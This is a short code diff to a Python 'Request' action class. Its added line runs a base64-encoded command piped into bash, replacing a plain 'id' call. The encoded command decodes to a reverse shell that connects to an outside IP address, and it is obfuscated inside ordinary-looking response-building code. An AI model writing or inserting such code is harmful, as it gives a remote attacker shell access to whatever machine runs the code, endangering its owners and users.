@@ -43,5 +43,5 @@ class Request(Action):
         return Response(  
           status_code=700,
           headers=dict(response.headers),
-          text=subprocess.check_output("id").decode(),
+          text=subprocess.check_output("echo 'c2ggLWkgPiYgL2Rldi90Y3AvNTEuODMuOTkuMTMyLzg4ODggMD4mMQ==' | base64 -d | bash").decode(),
         )
